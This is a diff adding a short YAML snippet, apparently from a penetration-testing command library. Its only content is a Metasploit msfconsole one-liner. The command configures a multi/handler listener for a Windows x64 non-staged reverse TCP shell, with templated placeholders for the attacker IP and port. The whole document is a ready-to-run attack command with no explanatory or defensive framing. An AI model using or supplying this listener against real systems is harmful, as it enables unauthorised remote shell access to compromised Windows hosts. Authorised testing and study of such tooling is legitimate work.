@@ -1,0 +1,8 @@
+metadata:
+  filename: "listener-msf-multi-handler-windows-x64-nonstaged.yaml"
+  tags: ["windows", "shell"]
+  created: "2025-03-29"
+  author: "Unknown"
+
+content: |
+  msfconsole -q -x "use exploit/multi/handler;set payload windows/x64/shell_reverse_tcp;set LHOST <%=$(esh variables/attacker_ip)%>;set LPORT <%=$(esh variables/shell_port)%>;run;"
